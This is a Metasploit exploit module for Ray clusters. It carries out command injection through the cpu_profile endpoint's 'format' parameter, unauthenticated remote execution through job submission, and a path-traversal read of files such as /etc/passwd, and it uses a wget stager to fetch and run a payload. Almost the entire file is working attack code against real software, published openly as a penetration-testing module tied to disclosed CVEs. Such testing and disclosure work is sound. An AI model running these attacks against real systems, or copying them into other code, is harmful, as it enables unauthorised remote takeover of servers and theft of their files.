##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Ray cpu_profile command injection, Ray Agent Job RCE and Ray static arbitrary file read',
        'Description' => %q{
          Ray RCE via cpu_profile command injection vulnerability.

          RCE in Ray via the agent job submission endpoint.
          This is intended functionality as Ray's main purpose is executing arbitrary workloads.
          By default Ray has no authentication.

          Ray before 2.8.1 is vulnerable to a local file inclusion.
        },
        'Author' => [
          'sierrabearchell',                      # Vulnerability discovery
          'byt3bl33d3r <marcello@protectai.com>', # Python Metasploit module
          'danmcinerney <dan@protectai.com>',     # Python Metasploit module
          'Takahiro Yokoyama'                     # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2023-6019'],
          ['URL', 'https://huntr.com/bounties/d0290f3c-b302-4161-89f2-c13bb28b4cfe/'],
          # RCE
          ['URL', 'https://huntr.com/bounties/b507a6a0-c61a-4508-9101-fceb572b0385/'],
          ['URL', 'https://huntr.com/bounties/787a07c0-5535-469f-8c53-3efa4e5717c7/'],
          ['CVE', '2023-6020'],
          ['URL', 'https://huntr.com/bounties/83dd8619-6dc3-4c98-8f1b-e620fedcd1f6/'],
          ['URL', 'https://github.com/protectai/ai-exploits/tree/main/ray']
        ],
        'CmdStagerFlavor' => %i[wget],
        'Payload' => {
          'DisableNops' => true
        },
        'Platform' => %w[linux],
        'Targets' => [
          [ 'Linux x64', { 'Arch' => ARCH_X64, 'Platform' => 'linux' } ],
          [ 'Linux x86', { 'Arch' => ARCH_X86, 'Platform' => 'linux' } ],
          [ 'Linux aarch64', { 'Arch' => ARCH_AARCH64, 'Platform' => 'linux' } ]
        ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2023-11-15',
        'Notes' => {
          'Stability' => [ CRASH_SAFE, ],
          'SideEffects' => [],
          'Reliability' => [ REPEATABLE_SESSION, ]
        }
      )
    )

    register_options(
      [
        Opt::RPORT(8265),
        OptEnum.new('ATTACK', [true, 'The attack type to use. Default is CMDi (CVE-2023-6019). but RCE (No CVE) and LFI (CVE-2023-6020) can also be chosen.', 'CMDi', ['CMDi', 'RCE', 'LFI']]),
        OptString.new('COMMAND', [ false, 'The command to execute', 'echo \'Hello from Metasploit\'' ]),
        OptString.new('FILEPATH', [ false, 'File to read', '/etc/passwd'])
      ]
    )
  end

  def get_nodes
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'nodes?view=summary')
    })
    return unless res && res.code == 200

    JSON.parse(res.body)
  end

  def get_job_data(cmd)
    fail_with(Failure::Unknown, 'COMMAND required when ATTACK is RCE') unless cmd
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'api/jobs/'),
      'data' => { 'entrypoint' => cmd }.to_json
    })
    unless res && res.code == 200
      res = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path, 'api/job_agent/jobs/'),
        'data' => { 'entrypoint' => cmd }.to_json
      })
    end
    return unless res && res.code == 200

    JSON.parse(res.body)
  end

  def lfi
    fail_with(Failure::Unknown, 'FILEPATH required when ATTACK is LFI') unless datastore['FILEPATH']
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, "static/js/../../../../../../../../../../../../../..#{datastore['FILEPATH']}")
    })
    return unless res && res.code == 200

    res.body
  end

  def check
    case datastore['ATTACK']
    when 'CMDi'
      @nodes = get_nodes
      return Exploit::CheckCode::Safe if @nodes.nil?
    when 'RCE'
      @job_data = get_job_data(datastore['COMMAND'])
      return Exploit::CheckCode::Safe if @job_data.nil?
    when 'LFI'
      @file_content = lfi
      return Exploit::CheckCode::Safe if @file_content.nil?

      return Exploit::CheckCode::Vulnerable
    end
    Exploit::CheckCode::Detected
  end

  def exploit
    case datastore['ATTACK']
    when 'CMDi'
      # We need to pass valid node info to /worker/cpu_profile for the server to process the request
      # First we list all nodes and grab the pid and ip of the first one (could be any)
      @nodes ||= get_nodes
      fail_with(Failure::Unknown, 'Failed to get nodes') unless @nodes
      first_node = @nodes['data']['summary'].first
      fail_with(Failure::Unknown, 'Failed to get pid') unless first_node.key?('agent') && first_node['agent'].key?('pid')
      pid = first_node['agent']['pid']
      fail_with(Failure::Unknown, 'Failed to get ip') unless first_node.key?('ip')
      ip = first_node['ip']
      print_good("Grabbed node info, pid: #{pid}, ip: #{ip}")
      opts = { pid: pid, ip: ip }
      res = execute_command(datastore['COMMAND'], opts)
      fail_with(Failure::Unknown, 'Failed to execute command') unless res
      print_good("Command execution seems to have been successful. Status code: #{res.code}")
      execute_cmdstager({ flavor: :wget }.merge(opts))
    when 'RCE'
      @job_data ||= get_job_data(datastore['COMMAND'])
      print_good("Command execution successful. Job ID: '#{@job_data['job_id']}' Submission ID: '#{@job_data['submission_id']}'")
      execute_cmdstager({ flavor: :wget })
    when 'LFI'
      @file_content ||= lfi
      print_good("#{datastore['FILEPATH']}\n#{@file_content}")
    end
  end

  def execute_command(cmd, opts = {})
    case datastore['ATTACK']
    when 'CMDi'
      send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, 'worker/cpu_profile'),
        'vars_get' => {
          'pid' => opts[:pid],
          'ip' => opts[:ip],
          'duration' => 5,
          'native' => 0,
          'format' => "`#{cmd}`"
        }
      })
    when 'RCE'
      get_job_data(cmd)
    end
  end

end
